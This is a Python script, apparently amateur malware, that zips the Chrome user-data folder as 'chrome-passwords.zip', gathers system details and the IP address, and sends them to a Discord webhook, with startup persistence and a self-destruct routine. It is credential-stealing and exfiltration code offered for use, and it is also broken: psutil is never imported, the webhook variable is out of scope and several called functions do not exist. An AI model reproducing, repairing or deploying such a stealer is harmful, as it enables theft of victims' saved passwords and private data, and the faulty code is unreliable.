import os
import zipfile
import requests
import time
import pyautogui
import platform
import subprocess

def chrome_passwords():
  """Creates a zip file of the Chrome user data directory and sends it to a Discord webhook."""

  chrome_user_data_dir = os.path.join(os.getenv("APPDATA"), "Local", "Google", "Chrome", "User Data", "Default")
  zip_file = zipfile.ZipFile("chrome-passwords.zip", "w")
  for file in os.listdir(chrome_user_data_dir):
    zip_file.write(os.path.join(chrome_user_data_dir, file))
  zip_file.close()

  webhook_url = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL"
  files = {"file": open("chrome-passwords.zip", "rb")}

def send_webhook(message):
  requests.post(webhook_url, data=message)

def get_pc_info():
  """Gets information about the PC."""
  pc_info = {
      "os": os.name,
      "cpu": platform.processor(),
      "ram": psutil.virtual_memory().total / (1024 ** 3),
  }
  return pc_info

def is_running_in_background():
  """Checks if the program is running in the background."""
  if __name__ != "__main__":
    return True
  else:
    return False

def is_program_working():
  try:
    chrome_passwords()
    return True
  except FileNotFoundError:
    return False

def info():
  """Prints information about the PC and the program and sends it to the Discord webhook."""
  pc_info = {
      "os": os.name,
      "cpu": platform.processor(),
      "ram": psutil.virtual_memory().total / (1024 ** 3),
  }
  message = f"PC information:`{pc_info}`"
  send_webhook(message)

  print("Program information:")
  print(f"  Is running in background: {is_running_in_background()}")
  print(f"  Is program working: {is_program_working()}")

  # Get Wi-Fi info
  ip_address = subprocess.check_output(["ipconfig", "/all"], universal_newlines=True)
  for line in ip_address.splitlines():
    if "IPv4 Address" in line:
      ip_address = line.split(":")[1].strip()
      break

  message = f"Wi-Fi IP address: {ip_address}"
  send_webhook(message)

def destruct():
  """Self-destructs the program."""
  os.remove(__file__)
  exit()

if __name__ == "__main__":
  add_to_startup()
  run_in_background()

if __name__ == "__main__":
  run_with_prefix("?")

if command == "info":
  info()
